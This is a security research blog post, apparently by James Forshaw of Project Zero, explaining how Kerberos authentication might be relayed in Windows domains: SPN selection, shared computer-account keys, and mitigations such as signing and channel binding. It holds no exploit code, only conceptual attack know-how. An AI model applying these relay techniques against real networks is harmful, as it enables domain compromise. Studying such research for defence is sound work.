0}.lst-kix_wkcrlfh2qk3l-2>li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-2}ol.lst-kix_i2wckd3yhfhe-2.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-2 0}.lst-kix_d25vxsk234hv-0>li{counter-increment:lst-ctn-kix_d25vxsk234hv-0}ol.lst-kix_d25vxsk234hv-5.start{counter-reset:lst-ctn-kix_d25vxsk234hv-5 0}ol.lst-kix_jp16emg17n48-8{list-style-type:none}.lst-kix_d25vxsk234hv-6>li{counter-increment:lst-ctn-kix_d25vxsk234hv-6}ol.lst-kix_jp16emg17n48-7{list-style-type:none}.lst-kix_i2wckd3yhfhe-1>li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-1}ol.lst-kix_i2wckd3yhfhe-8.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-8 0}.lst-kix_i2wckd3yhfhe-4>li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-4}ol.lst-kix_jp16emg17n48-4{list-style-type:none}ol.lst-kix_jp16emg17n48-3{list-style-type:none}ol.lst-kix_jp16emg17n48-6{list-style-type:none}ol.lst-kix_jp16emg17n48-5{list-style-type:none}ol.lst-kix_jp16emg17n48-0{list-style-type:none}ol.lst-kix_jp16emg17n48-2{list-style-type:none}.lst-kix_d25vxsk234hv-3>li{counter-increment:lst-ctn-kix_d25vxsk234hv-3}.lst-kix_i2wckd3yhfhe-7>li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-7}ol.lst-kix_jp16emg17n48-1{list-style-type:none}.lst-kix_fmj6vk2ylkib-1>li:before{content:"\0025cb  "}.lst-kix_wkcrlfh2qk3l-1>li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-1}.lst-kix_fmj6vk2ylkib-0>li:before{content:"\0025cf  "}.lst-kix_fmj6vk2ylkib-2>li:before{content:"\0025a0  "}.lst-kix_fmj6vk2ylkib-3>li:before{content:"\0025cf  "}ol.lst-kix_wkcrlfh2qk3l-8.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-8 0}.lst-kix_i2wckd3yhfhe-1>li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-1,lower-latin) ") "}.lst-kix_jp16emg17n48-2>li{counter-increment:lst-ctn-kix_jp16emg17n48-2}.lst-kix_i2wckd3yhfhe-2>li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-2,lower-roman) ") "}.lst-kix_i2wckd3yhfhe-6>li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-6}.lst-kix_i2wckd3yhfhe-4>li:before{content:"(" counter(lst-ctn-kix_i2wckd3yhfhe-4,lower-latin) ") "}.lst-kix_wkcrlfh2qk3l-7>li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-7,lower-latin) ". "}.lst-kix_wkcrlfh2qk3l-8>li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-8,lower-roman) ". "}.lst-kix_i2wckd3yhfhe-3>li:before{content:"(" counter(lst-ctn-kix_i2wckd3yhfhe-3,decimal) ") "}.lst-kix_i2wckd3yhfhe-5>li:before{content:"(" counter(lst-ctn-kix_i2wckd3yhfhe-5,lower-roman) ") "}.lst-kix_jp16emg17n48-3>li{counter-increment:lst-ctn-kix_jp16emg17n48-3}.lst-kix_i2wckd3yhfhe-5>li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-5}ol.lst-kix_jp16emg17n48-6.start{counter-reset:lst-ctn-kix_jp16emg17n48-6 0}.lst-kix_i2wckd3yhfhe-8>li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-8,lower-roman) ". "}.lst-kix_d25vxsk234hv-8>li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-8,lower-roman) ". "}ol.lst-kix_wkcrlfh2qk3l-5.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-5 0}ol.lst-kix_i2wckd3yhfhe-1.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-1 0}.lst-kix_i2wckd3yhfhe-7>li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-7,lower-latin) ". "}.lst-kix_i2wckd3yhfhe-6>li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-6,decimal) ". "}.lst-kix_jp16emg17n48-1>li{counter-increment:lst-ctn-kix_jp16emg17n48-1}.lst-kix_d25vxsk234hv-4>li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-4,lower-latin) ". "}.lst-kix_wkcrlfh2qk3l-0>li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-0,decimal) ". "}.lst-kix_d25vxsk234hv-8>li{counter-increment:lst-ctn-kix_d25vxsk234hv-8}.lst-kix_jp16emg17n48-4>li{counter-increment:lst-ctn-kix_jp16emg17n48-4}.lst-kix_d25vxsk234hv-3>li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-3,decimal) ". "}.lst-kix_d25vxsk234hv-5>li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-5,lower-roman) ". "}ol.lst-kix_i2wckd3yhfhe-6.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-6 0}.lst-kix_wkcrlfh2qk3l-1>li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-1,lower-latin) ". "}ol.lst-kix_wkcrlfh2qk3l-2.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-2 0}.lst-kix_d25vxsk234hv-7>li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-7,lower-latin) ". "}ol.lst-kix_d25vxsk234hv-4.start{counter-reset:lst-ctn-kix_d25vxsk234hv-4 0}.lst-kix_d25vxsk234hv-6>li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-6,decimal) ". "}.lst-kix_wkcrlfh2qk3l-6>li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-6,decimal) ". "}.lst-kix_fmj6vk2ylkib-8>li:before{content:"\0025a0  "}.lst-kix_fmj6vk2ylkib-7>li:before{content:"\0025cb  "}.lst-kix_wkcrlfh2qk3l-5>li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-5,lower-roman) ". "}.lst-kix_wkcrlfh2qk3l-0>li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-0}.lst-kix_i2wckd3yhfhe-0>li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-0,decimal) ") "}.lst-kix_fmj6vk2ylkib-5>li:before{content:"\0025a0  "}.lst-kix_d25vxsk234hv-0>li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-0,decimal) ". "}.lst-kix_wkcrlfh2qk3l-3>li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-3,decimal) ". "}.lst-kix_wkcrlfh2qk3l-4>li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-4,lower-latin) ". "}ol.lst-kix_d25vxsk234hv-7.start{counter-reset:lst-ctn-kix_d25vxsk234hv-7 0}.lst-kix_wkcrlfh2qk3l-3>li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-3}.lst-kix_fmj6vk2ylkib-4>li:before{content:"\0025cb  "}.lst-kix_fmj6vk2ylkib-6>li:before{content:"\0025cf  "}.lst-kix_d25vxsk234hv-1>li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-1,lower-latin) ". "}.lst-kix_d25vxsk234hv-2>li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-2,lower-roman) ". "}.lst-kix_wkcrlfh2qk3l-2>li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-2,lower-roman) ". "}.lst-kix_wkcrlfh2qk3l-4>li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-4}.lst-kix_d25vxsk234hv-1>li{counter-increment:lst-ctn-kix_d25vxsk234hv-1}ol.lst-kix_d25vxsk234hv-8.start{counter-reset:lst-ctn-kix_d25vxsk234hv-8 0}ol.lst-kix_d25vxsk234hv-1.start{counter-reset:lst-ctn-kix_d25vxsk234hv-1 0}.lst-kix_d25vxsk234hv-7>li{counter-increment:lst-ctn-kix_d25vxsk234hv-7}.lst-kix_i2wckd3yhfhe-3>li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-3}.lst-kix_jp16emg17n48-5>li{counter-increment:lst-ctn-kix_jp16emg17n48-5}ol.lst-kix_jp16emg17n48-7.start{counter-reset:lst-ctn-kix_jp16emg17n48-7 0}ol.lst-kix_wkcrlfh2qk3l-4{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-0.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-0 0}ol.lst-kix_wkcrlfh2qk3l-3{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-2{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-1{list-style-type:none}.lst-kix_i2wckd3yhfhe-8>li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-8}ol.lst-kix_wkcrlfh2qk3l-0{list-style-type:none}ol.lst-kix_jp16emg17n48-1.start{counter-reset:lst-ctn-kix_jp16emg17n48-1 0}ol.lst-kix_i2wckd3yhfhe-4.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-4 0}ol.lst-kix_wkcrlfh2qk3l-8{list-style-type:none}.lst-kix_i2wckd3yhfhe-2>li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-2}ol.lst-kix_wkcrlfh2qk3l-7{list-style-type:none}.lst-kix_2yktnm17nyl7-4>li:before{content:"\0025cb  "}ol.lst-kix_wkcrlfh2qk3l-6{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-5{list-style-type:none}ol.lst-kix_d25vxsk234hv-2.start{counter-reset:lst-ctn-kix_d25vxsk234hv-2 0}.lst-kix_2yktnm17nyl7-5>li:before{content:"\0025a0  "}.lst-kix_2yktnm17nyl7-6>li:before{content:"\0025cf  "}.lst-kix_2yktnm17nyl7-7>li:before{content:"\0025cb  "}ol.lst-kix_wkcrlfh2qk3l-7.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-7 0}.lst-kix_2yktnm17nyl7-8>li:before{content:"\0025a0  "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_wkcrlfh2qk3l-1.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-1 0}ol.lst-kix_jp16emg17n48-0.start{counter-reset:lst-ctn-kix_jp16emg17n48-0 0}ol{margin:0;padding:0}table td,table th{padding:0}.c29{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:49.5pt;border-top-color:#000000;border-bottom-style:solid}.c10{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:66.8pt;border-top-color:#000000;border-bottom-style:solid}.c11{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c22{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:87pt;border-top-color:#000000;border-bottom-style:solid}.c30{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:81pt;border-top-color:#000000;border-bottom-style:solid}.c15{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:164.2pt;border-top-color:#000000;border-bottom-style:solid}.c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c26{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c31{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:"Arial";font-style:normal}.c32{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c39{-webkit-text-decoration-skip:none;color:#000000;text-decoration:line-through;vertical-align:baseline;text-decoration-skip-ink:none;font-style:normal}.c38{color:#000000;text-decoration:none;vertical-align:super;font-style:normal}.c21{border-spacing:0;border-collapse:collapse;margin-right:auto}.c7{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c6{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c8{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c25{font-weight:400;font-size:11pt;font-family:"Arial"}.c37{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c19{font-weight:400;font-size:16pt;font-family:"Arial"}.c2{font-size:10pt;font-family:"Courier New";font-weight:400}.c12{font-weight:400;font-size:11pt;font-family:"Courier New"}.c40{font-weight:400;font-size:10pt;font-family:"Arial"}.c14{color:#000000;text-decoration:none;vertical-align:baseline}.c42{font-family:"Courier New";font-weight:400}.c16{border:1px solid black;margin:5px}.c18{margin-left:36pt;padding-left:0pt}.c5{color:inherit;text-decoration:inherit}.c24{padding:0;margin:0}.c28{background-color:#ffff00}.c33{background-color:#cccccc}.c9{height:11pt}.c17{color:#696969}.c34{color:#000080}.c4{font-style:italic}.c13{color:#0000ff}.c35{color:#8a2be2}.c36{color:#a31515}.c23{color:#a82d00}.c20{height:0pt}.c41{vertical-align:super}.c27{color:#8b0000}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c37"><div>
 <p class="c0 c9"><span class="c3"></span></p></div>
 <p class="c0"><span class="c3">Posted by James Forshaw, Project Zero</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>This blog post is a summary of some research I&#39;ve been doing into relaying Kerberos authentication in Windows domain environments. To keep this blog shorter I am going to assume you have a working knowledge of Windows network authentication, and specifically Kerberos and NTLM. For a quick primer on Kerberos see </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b4af186e-b2ff-43f9-b18e-eedb366abf13">this page</a></span><span>&nbsp;which is part of Microsoft&#39;s Kerberos extension documentation or you can always read </span><span class="c8"><a class="c51" href="https://www.rfc-editor.org/rfc/rfc4120.txt">RFC4120</a></span><span class="c3">.</span></p><h2 class="c26" id="h.yuh7isexpwgo"><span class="c6 c19">Background</span></h2>
 <p class="c0"><span>Windows based enterprise networks rely on network authentication protocols, such as </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b38c36ed-2804-4868-a9ff-8dd3182128e4">NT Lan Manager (NTLM)</a></span><span>&nbsp;and Kerberos to implement single sign on. These protocols allow domain users to seamlessly connect to corporate resources without having to repeatedly enter their passwords. This works by the computer&#39;s </span><span class="c4">Local Security Authority (LSA)</span><span class="c3">&nbsp;process storing the user&#39;s credentials when the user first authenticates. The LSA can then reuse those credentials for network authentication without requiring user interaction.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">However, the convenience of not prompting the user for their credentials when performing network authentication has a downside. To be most useful, common clients for network protocols such as HTTP or SMB must automatically perform the authentication without user interaction otherwise it defeats the purpose of avoiding asking the user for their credentials. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">This automatic authentication can be a problem if an attacker can trick a user into connecting to a server they control. The attacker could induce the user&#39;s network client to start an authentication process and use that information to authenticate to an unrelated service allowing the attacker to access that service&#39;s resources as the user. When the authentication protocol is captured and forwarded to another system in this way it&#39;s referred to as an Authentication Relay attack.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"></p>
 <p class="c0"><span class="c25 c14 c4"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEjeIXhBwnBcGsUREqJ9YPAEyeTw99GDlcn_PmW7fyuxGGkop9HvtErkOKfvy6WXzeXZFfXdOR8C-StQgu3qPaE-t48EHnQ0xPbUgBDm3-jyO_dij-bFHf4Vw6v-ryL9D7FixnLa6I88bzvbkx-QNGx7Wxhc3GGWmJGa9Xbu1-HIZGM0SA1HQWcERC_y2w=s856" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/a/AVvXsEjeIXhBwnBcGsUREqJ9YPAEyeTw99GDlcn_PmW7fyuxGGkop9HvtErkOKfvy6WXzeXZFfXdOR8C-StQgu3qPaE-t48EHnQ0xPbUgBDm3-jyO_dij-bFHf4Vw6v-ryL9D7FixnLa6I88bzvbkx-QNGx7Wxhc3GGWmJGa9Xbu1-HIZGM0SA1HQWcERC_y2w=s856" border="0" alt="Simple diagram of an authentication relay attack" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Authentication relay attacks using the NTLM protocol were </span><span class="c8"><a class="c51" href="https://web.archive.org/web/20030706050349/http://www.xfocus.net/articles/200305/smbrelay.html">f</a></span><span class="c8"><a class="c51" href="https://web.archive.org/web/20030706050349/http://www.xfocus.net/articles/200305/smbrelay.html">irst published</a></span><span>&nbsp;all the way back in 2001 by Josh Buchbinder (Sir Dystic) of the Cult of the Dead Cow</span><span>. However, even in 2021 NTLM relay attacks still represent a threat in default configurations of Windows domain networks. The most recent major abuse of NTLM relay was through the </span><span class="c8"><a class="c51" href="https://specterops.io/assets/resources/Certified_Pre-Owned.pdf">Active Directory Certificate Services web enrollment service</a></span><span>. This combined with the </span><span class="c8"><a class="c51" href="https://github.com/topotam/PetitPotam">PetitPotam</a></span><span class="c3">&nbsp;technique to induce a Domain Controller to perform NTLM authentication allows for a Windows domain to be compromised by an unauthenticated attacker.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Over the years Microsoft has made many efforts to mitigate authentication relay attacks. The best mitigations rely on the fact that the attacker does not have knowledge of the user&#39;s password or control over the authentication process. This includes signing and encryption (sealing) of network traffic using a session key which is protected by the user&#39;s password or channel binding as part of </span><span class="c8"><a class="c51" href="https://msrc-blog.microsoft.com/2009/12/08/extended-protection-for-authentication/">Extended Protection for Authentication (EPA)</a></span><span class="c3">&nbsp;which prevents relay of authentication to a network protocol under TLS.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Another mitigation regularly proposed is to disable NTLM authentication either for particular services or network wide using </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain">Group Policy</a></span><span class="c3">. While this has potential compatibility issues, restricting authentication to only Kerberos should be more secure. That got me thinking, is disabling NTLM sufficient to eliminate authentication relay attacks on Windows domains?</span></p><h2 class="c26" id="h.58jp1dccho9f"><span class="c6 c19">Why are there no Kerberos Relay Attacks?</span></h2>
 <p class="c0"><span>The obvious question is, if NTLM is disabled could you relay Kerberos authentication instead? Searching for Kerberos Relay attacks doesn&#39;t yield much public research that I could find. There is the </span><span class="c8"><a class="c51" href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a></span><span>&nbsp;tool written by </span><span class="c8"><a class="c51" href="https://twitter.com/_dirkjan">Dirk-jan</a></span><span>&nbsp;which is similar in concept to the </span><span class="c8"><a class="c51" href="https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx">ntlmrelayx</a></span><span>&nbsp;tool in </span><span class="c8"><a class="c51" href="https://github.com/SecureAuthCorp/impacket">impacket</a></span><span>, a common tool for performing NTLM authentication relay attacks</span><span>. However as the accompanying </span><span class="c8"><a class="c51" href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">blog post</a></span><span>&nbsp;makes clear this is a tool to abuse </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/defender-for-identity/cas-isp-unconstrained-kerberos">unconstrained delegation</a></span><span class="c3">&nbsp;rather than relay the authentication. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>I did find a </span><span class="c8"><a class="c51" href="https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Sagi%20Sheinfeld%20Eyal%20Karni%20Yaron%20Zinar%20-%20Using%20Machine-in-the-Middle%20to%20Attack%20Active%20Directory%20Authentication%20Schemes.pdf">recent presentation</a></span><span>&nbsp;by Sagi Sheinfeld, </span><span class="c8"><a class="c51" href="https://twitter.com/eyal_karni">Eyal Karni</a></span><span>, </span><span class="c8"><a class="c51" href="https://twitter.com/YaronZi">Yaron Zinar</a></span><span>&nbsp;from Crowdstrike at Defcon 29 (and also coming up at Blackhat EU 2021) which relayed Kerberos authentication. The presentation discussed MitM network traffic to specific servers, then relaying the Kerberos authentication. A MitM attack relies on being able to spoof an existing server through some mechanism, which is a well known risk. &nbsp;The last line in the presentation is </span><span class="c4">&quot;Microsoft Recommendation: Avoid being MITM&rsquo;d&hellip;&quot;</span><span>&nbsp;which seems a </span><span>reasonable approach to take if possible</span><span class="c3">.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">However a MitM attack is slightly different to the common NTLM relay attack scenario where you can induce a domain joined system to authenticate to a server an attacker controls and then forward that authentication to an unrelated service. NTLM is easy to relay as it wasn&#39;t designed to distinguish authentication to a particular service from any other. The only unique aspect was the server (and later client) challenge but that value wasn&#39;t specific to the service and so authentication for say SMB could be forwarded to HTTP and the victim service couldn&#39;t tell the difference. Subsequently EPA has been retrofitted onto NTLM to make the authentication specific to a service, but due to backwards compatibility these mitigations aren&#39;t always used.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>On the other hand Kerberos has always required the target of the authentication to be specified beforehand through a </span><span class="c4">principal name</span><span>, typically this is a </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names">Service Principal Name (SPN)</a></span><span>&nbsp;although in certain circumstances it can be a </span><span class="c4">User Principal Name (UPN)</span><span>.</span><span>&nbsp;The SPN is usually represented as a string of the form </span><span class="c4">CLASS/INSTANCE:PORT/NAME</span><span>, where </span><span class="c4">CLASS</span><span>&nbsp;is the class of service, such as </span><span class="c4">HTTP</span><span>&nbsp;or </span><span class="c4">CIFS</span><span>, </span><span class="c4">INSTANCE </span><span>is typically the DNS name of the server hosting the service and </span><span class="c4">PORT</span><span>&nbsp;and </span><span class="c4">NAME</span><span class="c3">&nbsp;are optional.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The SPN is used by the Kerberos </span><span class="c4">Ticket Granting Server (TGS)</span><span>&nbsp;to select the shared encryption key for a Kerberos service ticket generated for the authentication. This ticket contains the details of the authenticating user based on the contents of the </span><span class="c4">Ticket Granting Ticket (TGT)</span><span>&nbsp;that was requested during the user&#39;s initial Kerberos authentication process. The client can then package the service&#39;s ticket into an </span><span class="c4">Authentication Protocol Request (AP_REQ)</span><span class="c3">&nbsp;authentication token to send to the server.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Without knowledge of the shared encryption key the Kerberos service ticket can&#39;t be decrypted by the service and the authentication fails. Therefore if Kerberos authentication is attempted to an SMB service with the SPN </span><span class="c4">CIFS/fileserver.domain.com</span><span>, then that ticket shouldn&#39;t be usable if the relay target is a HTTP service with the SPN </span><span class="c4">HTTP/fileserver.domain.com</span><span>, as the shared key should be different.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>In practice that&#39;s rarely the case in Windows domain networks. The Domain Controller associates the SPN with a user account, most commonly the computer account of the domain joined server and the key is derived from the account&#39;s password. The </span><span class="c4">CIFS/fileserver.domain.com</span><span>&nbsp;and </span><span class="c4">HTTP/fileserver.domain.com </span><span>SPNs would likely be assigned to the </span><span class="c4">FILESERVER$</span><span class="c3">&nbsp;computer account, therefore the shared encryption key will be the same for both SPNs and in theory the authentication could be relayed from one service to the other. The receiving service could query for the authenticated SPN string from the authentication APIs and then compare it to its expected value, but this check is typically optional.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The selection of the SPN to use for the Kerberos authentication is typically defined by the target server&#39;s host name. In a relay attack the attacker&#39;s server will not be the same as the target. For example, the SMB connection might be targeting the attacker&#39;s server, and will assign the SPN </span><span class="c4">CIFS/evil.com</span><span>. Assuming this SPN is even registered it would in all probability have a different shared encryption key to the </span><span class="c4">CIFS/fileserver.domain.com </span><span>SPN due to the different computer accounts. Therefore relaying the authentication to the target SMB service will fail as the ticket can&#39;t be decrypted.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">The requirement that the SPN is associated with the target service&#39;s shared encryption key is why I assume few consider Kerberos relay attacks to be a major risk, if not impossible. There&#39;s an assumption that an attacker cannot induce a client into generating a service ticket for an SPN which differs from the host the client is connecting to.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">However, there&#39;s nothing inherently stopping Kerberos authentication being relayed if the attacker can control the SPN. The only way to stop relayed Kerberos authentication is for the service to protect itself through the use of signing/sealing or channel binding which rely on the shared knowledge between the client and server, but crucially not the attacker relaying the authentication. However, even now these service protections aren&#39;t the default even on critical protocols such as LDAP.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">As the only limit on basic Kerberos relay (in the absence of service protections) is the selection of the SPN, this research focuses on how common protocols select the SPN and whether it can be influenced by the attacker to achieve Kerberos authentication relay.</span></p><h2 class="c26" id="h.8vjgkoldr6oj"><span class="c6 c19">Kerberos Relay Requirements</span></h2>
 <p class="c0"><span>It&#39;s easy to demonstrate in a controlled environment that Kerberos relay is possible. We can write a simple client which uses the </span><span class="c8"><a class="c51" href="https://en.wikipedia.org/wiki/Security_Support_Provider_Interface">Security Support Provider Interface (SSPI)</a></span><span>&nbsp;APIs to communicate with the LSA and implement the network authentication. This client calls the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-initializesecuritycontextw">InitializeSecurityContext</a></span><span class="c3">&nbsp;API which will generate an AP_REQ authentication token containing a Kerberos Service Ticket for an arbitrary SPN. This AP_REQ can be forwarded to an intermediate server and then relayed to the service the SPN represents. You&#39;ll find this will work, again to reiterate, assuming that no service protections are in place.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>However, there are some caveats in the way a client calls </span><span class="c4">InitializeSecurityContext</span><span>&nbsp;which will impact how useful the generated AP_REQ is even if the attacker can influence the SPN. If the client specifies any one of the following request flags, </span><span class="c4">ISC_REQ_CONFIDENTIALITY,</span><span>&nbsp;</span><span class="c4">ISC_REQ_INTEGRITY</span><span>, </span><span class="c4">ISC_REQ_REPLAY_DETECT</span><span>&nbsp;or </span><span class="c4">ISC_REQ_SEQUENCE_DETECT</span><span>&nbsp;then the generated AP_REQ will enable encryption and/or integrity checking. When the AP_REQ is received by the server using the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-acceptsecuritycontext">AcceptSecurityContext</a></span><span class="c4">&nbsp;</span><span>API it will return a set of flags which indicate if the client enabled encryption or integrity checking. Some services use these </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/secauthn/context-requirements">returned flags</a></span><span class="c3">&nbsp;to opportunistically enable service protections. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
